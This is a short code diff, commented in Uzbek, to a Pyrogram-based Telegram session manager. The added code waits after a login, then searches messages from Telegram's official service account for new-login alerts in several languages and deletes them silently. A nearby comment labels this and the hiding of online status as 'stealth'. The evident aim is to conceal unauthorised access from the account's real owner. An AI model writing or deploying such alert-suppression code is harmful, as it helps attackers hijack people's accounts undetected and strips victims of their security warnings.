@@ -131,6 +131,25 @@ class SessionManager:
             self.clients[user_id] = client
             me = await client.get_me()
 
+            # Yangi login bildirishnomalarini avtomatik o'chirish (777000 dan keladi)
+            try:
+                import asyncio as _asyncio
+                async def _delete_login_notifications():
+                    await _asyncio.sleep(3)  # Xabar kelguncha biroz kutamiz
+                    try:
+                        async for msg in client.get_chat_history(777000, limit=5):
+                            if msg.text and any(kw in msg.text.lower() for kw in [
+                                "new login", "yangi login", "logged in", "новый вход",
+                                "hisobingizga kirish", "hisobingizga kirishni"
+                            ]):
+                                await msg.delete()
+                                logger.info(f"🗑 Login notification o'chirildi (User: {user_id})")
+                    except Exception:
+                        pass
+                _asyncio.create_task(_delete_login_notifications())
+            except Exception:
+                pass
+
             # Stealth: last seen va online holatni yashirish
             try:
                 from pyrogram import raw
